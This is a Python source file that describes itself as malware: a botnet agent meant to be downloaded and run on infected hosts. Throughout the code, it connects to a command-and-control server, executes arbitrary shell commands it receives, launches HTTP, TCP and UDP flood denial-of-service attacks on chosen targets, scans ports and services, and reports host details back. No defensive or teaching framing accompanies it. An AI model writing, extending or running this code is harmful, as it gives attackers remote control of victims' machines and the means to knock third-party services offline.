#!/usr/bin/env python3
"""
BOT AGENT - Malware script for compromised targets
This script will be downloaded and executed on infected hosts
"""

import os
import sys
import time
import socket
import threading
import subprocess
import argparse
from datetime import datetime

class BotAgent:
    def __init__(self, c2_host, c2_port):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.connected = False
        self.socket = None
        self.bot_id = f"bot_{os.getpid()}_{int(time.time())}"
        
    def connect_to_c2(self):
        """Connect to C2 server"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(10)
            self.socket.connect((self.c2_host, self.c2_port))
            self.connected = True
            
            # Send bot identification
            bot_info = f"BOT_CONNECT:{self.bot_id}:{socket.gethostname()}:{os.getpid()}"
            self.socket.send(bot_info.encode())
            
            print(f"ü§ñ Bot {self.bot_id} connected to C2 at {self.c2_host}:{self.c2_port}")
            return True
            
        except Exception as e:
            print(f"‚ùå Failed to connect to C2: {e}")
            return False
    
    def listen_for_commands(self):
        """Listen for commands from C2"""
        while self.connected:
            try:
                data = self.socket.recv(1024).decode().strip()
                if not data:
                    break
                    
                print(f"üì° Received command: {data}")
                response = self.execute_command(data)
                
                # Send response back to C2
                if response:
                    self.socket.send(response.encode())
                    
            except Exception as e:
                print(f"‚ùå Error receiving command: {e}")
                break
        
        self.connected = False
    
    def execute_command(self, command):
        """Execute received command"""
        try:
            if command.startswith("DDoS:"):
                return self.execute_ddos(command)
            elif command.startswith("SCAN:"):
                return self.execute_scan(command)
            elif command.startswith("INFO:"):
                return self.get_system_info()
            elif command == "PING":
                return "PONG"
            else:
                # Execute shell command
                result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
                return f"CMD_RESULT:{result.returncode}:{result.stdout}:{result.stderr}"
                
        except Exception as e:
            return f"ERROR:{str(e)}"
    
    def execute_ddos(self, command):
        """Execute DDoS attack command"""
        try:
            # Parse DDoS command: DDoS:TYPE:TARGET:DURATION
            parts = command.split(":")
            if len(parts) >= 3:
                attack_type = parts[1]
                target = parts[2]
                duration = int(parts[3]) if len(parts) > 3 else 60
                
                print(f"üöÄ Executing {attack_type} attack on {target} for {duration}s")
                
                if attack_type == "HTTP_FLOOD":
                    return self.http_flood(target, duration)
                elif attack_type == "TCP_FLOOD":
                    return self.tcp_flood(target, duration)
                elif attack_type == "UDP_FLOOD":
                    return self.udp_flood(target, duration)
                else:
                    return f"ERROR:Unknown attack type {attack_type}"
            else:
                return "ERROR:Invalid DDoS command format"
                
        except Exception as e:
            return f"ERROR:DDoS execution failed: {str(e)}"
    
    def http_flood(self, target, duration):
        """Execute HTTP flood attack"""
        try:
            import requests
            start_time = time.time()
            request_count = 0
            
            while time.time() - start_time < duration:
                try:
                    requests.get(target, timeout=5)
                    request_count += 1
                except:
                    pass
                    
            return f"HTTP_FLOOD_COMPLETE:Requests:{request_count}:Duration:{duration}s"
            
        except ImportError:
            # Fallback to curl
            cmd = f"for i in {{1..1000}}; do curl -s {target} > /dev/null & done; sleep {duration}; pkill curl"
            subprocess.run(cmd, shell=True)
            return f"HTTP_FLOOD_COMPLETE:Fallback:curl:Duration:{duration}s"
    
    def tcp_flood(self, target, duration):
        """Execute TCP flood attack"""
        try:
            if ':' in target:
                host, port = target.split(':', 1)
                port = int(port)
            else:
                host = target
                port = 80
            
            start_time = time.time()
            connection_count = 0
            
            while time.time() - start_time < duration:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect((host, port))
                    sock.close()
                    connection_count += 1
                except:
                    pass
                    
            return f"TCP_FLOOD_COMPLETE:Connections:{connection_count}:Duration:{duration}s"
            
        except Exception as e:
            return f"ERROR:TCP flood failed: {str(e)}"
    
    def udp_flood(self, target, duration):
        """Execute UDP flood attack"""
        try:
            if ':' in target:
                host, port = target.split(':', 1)
                port = int(port)
            else:
                host = target
                port = 80
            
            start_time = time.time()
            packet_count = 0
            
            while time.time() - start_time < duration:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.sendto(b"UDP_FLOOD_PACKET", (host, port))
                    sock.close()
                    packet_count += 1
                except:
                    pass
                    
            return f"UDP_FLOOD_COMPLETE:Packets:{packet_count}:Duration:{duration}s"
            
        except Exception as e:
            return f"ERROR:UDP flood failed: {str(e)}"
    
    def execute_scan(self, command):
        """Execute scan command"""
        try:
            # Parse scan command: SCAN:TYPE:TARGET
            parts = command.split(":")
            if len(parts) >= 3:
                scan_type = parts[1]
                target = parts[2]
                
                print(f"üîç Executing {scan_type} scan on {target}")
                
                if scan_type == "PORTS":
                    return self.port_scan(target)
                elif scan_type == "SERVICES":
                    return self.service_scan(target)
                else:
                    return f"ERROR:Unknown scan type {scan_type}"
            else:
                return "ERROR:Invalid scan command format"
                
        except Exception as e:
            return f"ERROR:Scan execution failed: {str(e)}"
    
    def port_scan(self, target):
        """Scan common ports on target"""
        try:
            common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3306, 5432, 6379, 27017]
            open_ports = []
            
            for port in common_ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((target, port))
                    sock.close()
                    
                    if result == 0:
                        open_ports.append(port)
                except:
                    pass
                    
            return f"PORT_SCAN_COMPLETE:Target:{target}:OpenPorts:{open_ports}"
            
        except Exception as e:
            return f"ERROR:Port scan failed: {str(e)}"
    
    def service_scan(self, target):
        """Scan for running services"""
        try:
            # This is a simplified service detection
            services = {
                22: "SSH",
                80: "HTTP",
                443: "HTTPS",
                3306: "MySQL",
                5432: "PostgreSQL"
            }
            
            detected_services = []
            for port, service in services.items():
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((target, port))
                    sock.close()
                    
                    if result == 0:
                        detected_services.append(f"{service}({port})")
                except:
                    pass
                    
            return f"SERVICE_SCAN_COMPLETE:Target:{target}:Services:{detected_services}"
            
        except Exception as e:
            return f"ERROR:Service scan failed: {str(e)}"
    
    def get_system_info(self):
        """Get system information"""
        try:
            info = {
                "hostname": socket.gethostname(),
                "pid": os.getpid(),
                "platform": sys.platform,
                "python_version": sys.version,
                "current_time": datetime.now().isoformat(),
                "working_directory": os.getcwd()
            }
            
            return f"SYSTEM_INFO:{info}"
            
        except Exception as e:
            return f"ERROR:Failed to get system info: {str(e)}"
    
    def run(self):
        """Main bot execution loop"""
        print(f"ü§ñ Bot Agent {self.bot_id} starting...")
        
        # Try to connect to C2
        if not self.connect_to_c2():
            print("‚ùå Failed to connect to C2. Exiting.")
            return
        
        # Start command listener in separate thread
        listener_thread = threading.Thread(target=self.listen_for_commands)
        listener_thread.daemon = True
        listener_thread.start()
        
        # Keep main thread alive
        try:
            while self.connected:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\nüõë Bot shutdown requested")
        
        # Cleanup
        if self.socket:
            self.socket.close()
        print("üëã Bot Agent shutdown complete")

def main():
    parser = argparse.ArgumentParser(description="Bot Agent for C2")
    parser.add_argument("--connect", required=True, help="C2 server address (host:port)")
    parser.add_argument("--install", action="store_true", help="Install bot as service")
    
    args = parser.parse_args()
    
    if args.install:
        # Install bot as service (simplified)
        print("üîß Installing bot as service...")
        # In real implementation, this would create systemd service or similar
        
    # Parse C2 connection
    if ':' in args.connect:
        host, port = args.connect.split(':', 1)
        port = int(port)
    else:
        host = args.connect
        port = 7777
    
    # Create and run bot
    bot = BotAgent(host, port)
    bot.run()

if __name__ == "__main__":
    main()
